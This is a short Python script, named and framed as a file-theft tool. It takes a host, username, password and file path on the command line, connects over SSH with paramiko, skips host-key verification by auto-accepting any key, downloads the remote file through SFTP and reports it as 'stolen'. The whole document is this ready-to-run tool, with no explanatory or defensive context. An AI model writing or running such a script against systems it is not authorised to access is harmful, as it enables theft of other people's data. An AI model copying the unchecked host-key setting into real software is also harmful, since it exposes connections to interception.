import paramiko
import sys

def steal_files(host, username, password, remote_path, local_path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, password=password)
    sftp = client.open_sftp()
    sftp.get(remote_path, local_path)
    sftp.close()
    client.close()
    print(f"File stolen: {remote_path} -> {local_path}")

if __name__ == "__main__":
    host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    remote_path = sys.argv[4]
    local_path = sys.argv[5]
    steal_files(host, username, password, remote_path, local_path)
